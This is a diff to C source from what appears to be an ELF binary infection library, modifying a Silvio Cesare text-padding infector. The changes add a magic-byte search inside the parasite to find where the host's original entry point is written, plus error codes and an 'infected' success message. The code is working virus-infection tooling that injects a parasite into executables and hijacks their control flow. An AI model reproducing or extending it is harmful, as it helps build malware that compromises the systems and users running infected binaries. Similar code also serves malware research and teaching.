@@ -43,8 +43,10 @@
 _u8 malelf_infect_silvio_padding(malelf_object* input,
                                   malelf_object* output,
                                   malelf_object* parasite,
-                                  _u32 offset_entry_point) {
+                                 _u32 offset_entry_point,
+                                 unsigned long int magic_bytes) {
     int i;
+    _i32 error = MALELF_SUCCESS;
     char text_found;
     elf_t *ielf;
     ElfW(Ehdr) *ehdr;
@@ -124,11 +126,12 @@ _u8 malelf_infect_silvio_padding(malelf_object* input,
     printf("Inserting parasite at offset %x vaddr 0x%x\n", (unsigned)end_of_text, (unsigned)parasite_vaddr);
 
     ehdr->e_shoff += PAGE_SIZE;
-    _malelf_parasite_silvio_padding(input, output, end_of_text, parasite, offset_entry_point, old_e_entry);
+    error = _malelf_parasite_silvio_padding(input, output, end_of_text, parasite, offset_entry_point, old_e_entry, magic_bytes);
+    
     
     malelf_close(input);
 
-    return MALELF_SUCCESS;
+    return error;
 }
 
 _u8 _malelf_parasite_silvio_padding(malelf_object* input,
@@ -136,18 +139,21 @@ _u8 _malelf_parasite_silvio_padding(malelf_object* input,
                                     unsigned int end_of_text,
                                     malelf_object* parasite,
                                      _u32 offset_entry_point,
-                                     unsigned old_e_entry) {
+                                    unsigned old_e_entry,
+                                    unsigned long int magic_bytes) {
     _u8 error;
-    unsigned int c;
+    unsigned int c, i;
     char *parasite_data = (char*)parasite->mem;
+    union malelf_dword magic_addr;
+
+    if (magic_bytes == 0) {
+        magic_addr.long_val = MALELF_MAGIC_BYTES;
+    } else {
+        magic_addr.long_val = magic_bytes;
+    }
 	
-    /* eot is: 
-     * end_of_text = e_hdr->e_phoff + nc * e_hdr->e_phentsize;
-     * end_of_text += p_hdr->p_filesz;
-     */ 
-
     LOG_SUCCESS("Inserting parasite\n");
-
+    
     if ((error = malelf_openw(output, output->fname)) != MALELF_SUCCESS) {
         LOG_ERROR("Failed to open file '%s' for write.\n", output->fname);
         exit(-1);
@@ -158,7 +164,38 @@ _u8 _malelf_parasite_silvio_padding(malelf_object* input,
         exit(-1);
     }
 
-    *(unsigned *)&parasite_data[offset_entry_point] = old_e_entry;
+    if (offset_entry_point == 0) {
+      int curSearch = 0;
+      i = 0;
+      while(i <= (unsigned)parasite->st_info.st_size) {
+        unsigned hex = parasite_data[i];
+
+        if(hex == magic_addr.char_val[curSearch]) { /* found a match */
+          curSearch++;                        /* search for next hex */
+          if(curSearch > 3) {                 /* found the whole magic number */
+            offset_entry_point = i - 3;
+            LOG_SUCCESS("Magic number found at '%d' bytes of malware\n", offset_entry_point);
+            break;
+          }
+        } else { /* didn't find a match */
+          curSearch = 0;                     /* go back to searching for first char */
+        }
+
+        i++;
+      }
+    }
+
+    if (offset_entry_point == 0) {
+        LOG_ERROR("Failed to find magic bytes in malware...\n");
+        return MALELF_EMISSING_MAGIC_BYTES;
+    }
+
+    if (offset_entry_point < (unsigned) parasite->st_info.st_size) {
+        *(unsigned *)&parasite_data[offset_entry_point] = old_e_entry;
+    } else {
+      LOG_ERROR("Invalid return offset for entry point in malware ...\n");
+      return MALELF_EINV_OFFSET_ENTRY;
+    }
 	
     if ((c = write(output->fd, parasite_data, parasite->st_info.st_size)) != (unsigned)parasite->st_info.st_size) {
         perror("write");
@@ -179,6 +216,8 @@ _u8 _malelf_parasite_silvio_padding(malelf_object* input,
         perror("write");
         exit(-1);
     }
+
+    LOG_SUCCESS("Successfully infected: %s\n", output->fname);
 
     return MALELF_SUCCESS;
 }
